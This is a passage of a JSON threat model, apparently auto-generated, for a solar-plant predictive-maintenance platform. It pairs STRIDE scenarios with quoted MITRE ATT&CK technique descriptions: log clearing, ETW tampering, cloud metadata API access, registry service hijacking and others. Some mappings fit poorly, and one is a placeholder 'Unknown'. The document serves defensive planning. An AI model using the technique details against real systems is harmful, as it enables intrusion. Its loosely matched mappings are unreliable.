                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof user credentials to access the LIGHT platform dashboard.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has partial knowledge of the user credentials.",
                    "Role": "Unauthorized User",
                    "Condition": "The attacker has obtained or guessed some user credentials."
                },
                {
                    "Assumption": "Two-factor authentication is not enforced.",
                    "Role": "System Administrator",
                    "Condition": "Absence of strong, multifactor authentication mechanisms."
                },
                {
                    "Assumption": "User credentials are not being monitored for suspicious activity.",
                    "Role": "Security Monitor",
                    "Condition": "Lack of monitoring tools or ignoring alerts."
                }
            ],
            "Potential Impact": "Unauthorized access to operational status, potential disruption in maintenance decisions, exposure of sensitive information.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "dashboard",
                "credentials",
                "unauthorized access"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker could spoof the receiver to the TOREADOR Platform to inject false data.",
            "Assumptions": [
                {
                    "Assumption": "Network communications are not encrypted.",
                    "Role": "Network Administrator",
                    "Condition": "Absence of encryption in network protocols."
                },
                {
                    "Assumption": "The receiver does not validate the source of incoming data sufficiently.",
                    "Role": "System Designer",
                    "Condition": "Weak or nonexistent data validation processes."
                },
                {
                    "Assumption": "Access control rules between the receiver and platform are lax.",
                    "Role": "System Administrator",
                    "Condition": "Improper configuration of access control policies."
                }
            ],
            "Potential Impact": "Data integrity risk, potential model corruption, and system disruption.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "receiver",
                "platform",
                "data injection"
            ],
            "mitre_technique": {
                "name": "Cloud API",
                "description": "Adversaries may abuse cloud APIs to execute malicious commands. APIs available in cloud environments provide various functionalities and are a feature-rich method for programmatic access to nearly all aspects of a tenant. These APIs may be utilized through various methods such as command line interpreters (CLIs), in-browser Cloud Shells, [PowerShell](https://attack.mitre.org/techniques/T1059/001) modules like Azure for PowerShell(Citation: Microsoft - Azure PowerShell), or software developer kits (SDKs) available for languages such as [Python](https://attack.mitre.org/techniques/T1059/006).  \n\nCloud API functionality may allow for administrative access across all major services in a tenant such as compute, storage, identity and access management (IAM), networking, and security policies.\n\nWith proper permissions (often via use of credentials such as [Application Access Token](https://attack.mitre.org/techniques/T1550/001) and [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), adversaries may abuse cloud APIs to invoke various functions that execute malicious actions. For example, CLI and PowerShell functionality may be accessed through binaries installed on cloud-hosted or on-premises hosts or accessed through a browser-based cloud shell offered by many cloud platforms (such as AWS, Azure, and GCP). These cloud shells are often a packaged unified environment to use CLI and/or scripting modules hosted as a container in the cloud environment.  ",
                "id": "attack-pattern--55bb4471-ff1f-43b4-88c1-c9384ec47abf",
                "technique_id": "T1059.009"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker might alter data collected by sensors before it reaches the data logger.",
            "Assumptions": [
                {
                    "Assumption": "The attacker has physical access to the sensor devices.",
                    "Role": "Field Attacker",
                    "Condition": "Limited physical security of sensor installations."
                },
                {
                    "Assumption": "Weak tamper-proof mechanisms on sensor devices.",
                    "Role": "Device Manufacturer",
                    "Condition": "Lack of robust tamper-evident features."
                },
                {
                    "Assumption": "Data from sensors is not encrypted.",
                    "Role": "System Integrator",
                    "Condition": "Failure to encrypt data at rest or in transit."
                }
            ],
            "Potential Impact": "Compromised data integrity, inaccurate predictions, and potential failure in power optimization.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "sensor",
                "data integrity",
                "physical access"
            ],
            "mitre_technique": {
                "name": "Indicator Blocking",
                "description": "An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting (Citation: Microsoft Lamin Sept 2017) or even disabling host-based sensors, such as Event Tracing for Windows (ETW),(Citation: Microsoft About Event Tracing 2018) by tampering settings that control the collection and flow of event telemetry. (Citation: Medium Event Tracing Tampering 2018) These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as [PowerShell](https://attack.mitre.org/techniques/T1086) or [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).\n\nETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell Set-EtwTraceProvider cmdlet or by interfacing directly with the registry to make alterations.\n\nIn the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis. This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events, such as security information and event management (SIEM) products. ",
                "id": "attack-pattern--6a5848a8-6201-4a2c-8a6a-ca5af8c6f3df",
                "technique_id": "T1054"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could tamper with the ML model on the TOREADOR platform to produce false predictions.",
            "Assumptions": [
                {
                    "Assumption": "ML model files are not adequately protected.",
                    "Role": "Data Scientist",
                    "Condition": "Lack of file integrity monitoring."
                },
                {
                    "Assumption": "Access control to the model files is weak.",
                    "Role": "System Administrator",
                    "Condition": "Lax permissions settings on model directories."
                },
                {
                    "Assumption": "Model training data can be manipulated.",
                    "Role": "Data Manager",
                    "Condition": "Exposure of training datasets to untrusted entities."
                }
            ],
            "Potential Impact": "Faulty predictions, potential power flow optimizations errors, and hardware failures.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "ML model",
                "platform",
                "integrity"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker could modify metadata related to the solar power plants to mislead the predictive maintenance system.",
            "Assumptions": [
                {
                    "Assumption": "Metadata storage is not protected.",
                    "Role": "System Designer",
                    "Condition": "Unprotected metadata repositories."
                },
                {
                    "Assumption": "Changes to metadata are not audited.",
                    "Role": "Compliance Officer",
                    "Condition": "Lack of logging and monitoring for metadata changes."
                },
                {
                    "Assumption": "Metadata has weak access controls.",
                    "Role": "System Administrator",
                    "Condition": "Improper configurations of access permissions."
                }
            ],
            "Potential Impact": "Misleading context for sensor data, system misconfigurations, and potential operational disruptions.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "metadata",
                "data integrity",
                "access controls"
            ],
            "mitre_technique": {
                "name": "Masquerading",
                "description": "Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.\n\nRenaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1036).(Citation: LOLBAS Main Site)",
                "id": "attack-pattern--42e8de7b-37b2-4258-905a-6897815e58e0",
                "technique_id": "T1036"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user could deny having modified system settings or data.",
            "Assumptions": [
                {
                    "Assumption": "System lacks proper logging and monitoring.",
                    "Role": "System Administrator",
                    "Condition": "Absence of log generation or retention policies."
                },
                {
                    "Assumption": "Logs are not secured or tamper-evident.",
                    "Role": "Security Officer",
                    "Condition": "Unprotected log files susceptible to tampering."
                },
                {
                    "Assumption": "Access to modify settings is poorly managed.",
                    "Role": "System Administrator",
                    "Condition": "Weak role-based access control implementation."
                }
            ],
            "Potential Impact": "Difficulty attributing actions to users, potential for denying unauthorized activities.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "system settings",
                "logging",
                "monitoring"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker could claim valid data was falsified if data integrity checks are weak.",
            "Assumptions": [
                {
                    "Assumption": "Integrity checks on data streams are insufficient.",
                    "Role": "System Architect",
                    "Condition": "Lack of robust integrity verification mechanisms."
                },
                {
                    "Assumption": "Incident response procedures are not clearly defined.",
                    "Role": "Incident Responder",
                    "Condition": "Inadequate incident documentation and handling processes."
                },
                {
                    "Assumption": "Security controls in place are minimal or misconfigured.",
                    "Role": "Security Engineer",
                    "Condition": "Insufficient configuration of security tools."
                }
            ],
            "Potential Impact": "Loss of data credibility, potential operational and predictive inaccuracies.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "data falsification",
                "integrity",
                "verification"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to influence external outcomes or hide activity, thus threatening the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making.\n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--1cfcb312-b8d7-47a4-b560-4b16cc677292",
                "technique_id": "T1565.001"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Internal staff could deny unauthorized access to ML models and data due to insufficient logging.",
            "Assumptions": [
                {
                    "Assumption": "Access to critical systems is not logged.",
                    "Role": "System Administrator",
                    "Condition": "Lack of comprehensive access logging."
                },
                {
                    "Assumption": "Systems don't enforce non-repudiation measures.",
                    "Role": "Security Designer",
                    "Condition": "Absence of digital signatures or similar mechanisms."
                },
                {
                    "Assumption": "Incident tracking procedures are poorly implemented.",
                    "Role": "Compliance Officer",
                    "Condition": "Inadequate incident tracking and response protocols."
                }
            ],
            "Potential Impact": "Unauthorized access goes unattributed, potential breach of sensitive data and models.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "ML models",
                "access logging",
                "non-repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Unauthorized access to sensor data during transmission due to lack of encryption.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted over unsecured channels.",
                    "Role": "Network Administrator",
                    "Condition": "Default or weak network security configurations."
                },
                {
                    "Assumption": "There is no encryption applied to the sensor data.",
                    "Role": "System Integrator",
                    "Condition": "Failure to implement data encryption frameworks."
                },
                {
                    "Assumption": "Network traffic is not monitored.",
                    "Role": "Security Analyst",
                    "Condition": "Inadequate network traffic monitoring and anomaly detection."
                }
            ],
            "Potential Impact": "Unauthorized exposure of sensitive data, leading to potential abuse and system compromise.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "sensor data",
                "encryption",
                "network security"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Exposed metadata due to poor access controls might lead to sensitive information leakage.",
            "Assumptions": [
                {
                    "Assumption": "Metadata is stored without sufficient protection.",
                    "Role": "System Designer",
                    "Condition": "Neglect of metadata security measures."
                },
                {
                    "Assumption": "Access to metadata is not properly controlled.",
                    "Role": "System Administrator",
                    "Condition": "Inadequate access control policies."
                },
                {
                    "Assumption": "Insufficient audit trails for metadata access.",
                    "Role": "Security Officer",
                    "Condition": "Lack of comprehensive audit and tracking mechanisms."
                }
            ],
            "Potential Impact": "Unauthorized access to metadata, potential information leakage, and contextual data misuse.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "metadata",
                "access control",
                "data leakage"
            ],
            "mitre_technique": {
                "name": "Cloud Instance Metadata API",
                "description": "Adversaries may attempt to access the Cloud Instance Metadata API to collect credentials and other sensitive data.\n\nMost cloud service providers support a Cloud Instance Metadata API which is a service provided to running virtual instances that allows applications to access information about the running virtual instance. Available information generally includes name, security group, and additional metadata including sensitive data such as credentials and UserData scripts that may contain additional secrets. The Instance Metadata API is provided as a convenience to assist in managing applications and is accessible by anyone who can access the instance.(Citation: AWS Instance Metadata API) A cloud metadata API has been used in at least one high profile compromise.(Citation: Krebs Capital One August 2019)\n\nIf adversaries have a presence on the running virtual instance, they may query the Instance Metadata API directly to identify credentials that grant access to additional resources. Additionally, adversaries may exploit a Server-Side Request Forgery (SSRF) vulnerability in a public facing web proxy that allows them to gain access to the sensitive information via a request to the Instance Metadata API.(Citation: RedLock Instance Metadata API 2018)\n\nThe de facto standard across cloud service providers is to host the Instance Metadata API at <code>http[:]//169.254.169.254</code>.\n",
                "id": "attack-pattern--19bf235b-8620-4997-b5b4-94e0659ed7c3",
                "technique_id": "T1552.005"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker could gain access to AI/ML model predictions and insights shared on the dashboard.",
            "Assumptions": [
                {
                    "Assumption": "Dashboard access is insecure.",
                    "Role": "Web Developer",
                    "Condition": "Weak frontend security and authentication layers."
                },
                {
                    "Assumption": "Session management flaws exist.",
                    "Role": "Application Architect",
                    "Condition": "Poor session handling and management."
                },
                {
                    "Assumption": "The dashboard data is not encrypted.",
                    "Role": "Database Administrator",
                    "Condition": "Unencrypted data storage policies."
                }
            ],
            "Potential Impact": "Exposure of sensitive predictions, potential misuse of information leading to adverse impacts.",
            "MITRE ATT&CK Keywords": [
                "information disclosure",
                "dashboard",
                "authentication",
                "session management"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker might overwhelm the data logger with excessive data, causing system disruption.",
            "Assumptions": [
                {
                    "Assumption": "Capabilities for rate-limiting are weak or nonexistent.",
                    "Role": "System Administrator",
                    "Condition": "No rate-limiting mechanisms implemented."
                },
                {
                    "Assumption": "The attacker has network access to the data logger.",
                    "Role": "Network Attacker",
                    "Condition": "Network vulnerabilities allowing access."
                },
                {
                    "Assumption": "System monitoring for anomalies is poor.",
                    "Role": "Security Analyst",
                    "Condition": "Lack of effective monitoring and response mechanisms."
                }
            ],
            "Potential Impact": "System unavailability, disrupted data collection and processing, impacting predictive maintenance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "data logger",
                "system disruption",
                "rate limiting"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "An attacker could launch a DoS attack on the LIGHT platform affecting user dashboard access.",
            "Assumptions": [
                {
                    "Assumption": "Network security measures are not strong.",
                    "Role": "Network Administrator",
                    "Condition": "Weak firewall and intrusion prevention systems."
                },
                {
                    "Assumption": "Limited capacity to handle network or application load surges.",
                    "Role": "System Architect",
                    "Condition": "Insufficient scalability and elasticity mechanisms."
                },
                {
                    "Assumption": "Incident response to DoS events is slow.",
                    "Role": "Incident Responder",
                    "Condition": "Lack of rapid response protocols in place."
                }
            ],
            "Potential Impact": "Disruption in accessing operational data and making timely maintenance decisions.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "LIGHT platform",
                "user dashboard",
                "network security"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "The TOREADOR cloud platform could be targeted by a substantial DDoS attack.",
            "Assumptions": [
                {
                    "Assumption": "The platform does not have DoS protection systems.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Lack of built-in DoS mitigations at the cloud level."
                },
                {
                    "Assumption": "The attacker can control multiple compromised devices.",
                    "Role": "Botnet Operator",
                    "Condition": "Access to a sizeable botnet."
                },
                {
                    "Assumption": "The platform's resource allocation is limited.",
                    "Role": "Cloud Manager",
                    "Condition": "Insufficient resource redundancy and allocation."
                }
            ],
            "Potential Impact": "Platform unavailability, hindered model training and prediction processes, impacting predictive maintenance.",
            "MITRE ATT&CK Keywords": [
                "denial of service",
                "TOREADOR",
                "cloud platform",
                "DDoS"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A low-privilege user could exploit a vulnerability to gain admin access to the LIGHT platform.",
            "Assumptions": [
                {
                    "Assumption": "System vulnerabilities exist.",
                    "Role": "System Developer",
                    "Condition": "Unpatched or zero-day vulnerabilities in the system."
                },
                {
                    "Assumption": "Access control measures are weak.",
                    "Role": "Security Engineer",
                    "Condition": "Weak implementation of access control mechanisms."
                },
                {
                    "Assumption": "Security audits are not frequent.",
                    "Role": "Compliance Officer",
                    "Condition": "Infrequent security auditing processes."
                }
            ],
            "Potential Impact": "Unauthorized administrative actions, potential for wide-scale system disruption and data manipulation.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "LIGHT platform",
                "vulnerability exploitation",
                "access control"
            ],
            "mitre_technique": {
                "name": "Services Registry Permissions Weakness",
                "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)\n\nIf the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, then the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).\n\nAdversaries may also alter other Registry keys in the service\u2019s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)\n\nThe <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service\u2019s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)\n\nAdversaries may also add the <code>Parameters</code> key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities.(Citation: microsoft_services_registry_tree)(Citation: troj_zegost) Additionally, If adversaries launch their malicious services using svchost.exe, the service\u2019s file may be identified using <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\servicename\\Parameters\\ServiceDll</code>.(Citation: malware_hides_service)",
                "id": "attack-pattern--17cc750b-e95b-4d7d-9dde-49e0de24148c",
                "technique_id": "T1574.011"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits weak permission settings to gain unauthorized access to metadata.",
            "Assumptions": [
                {
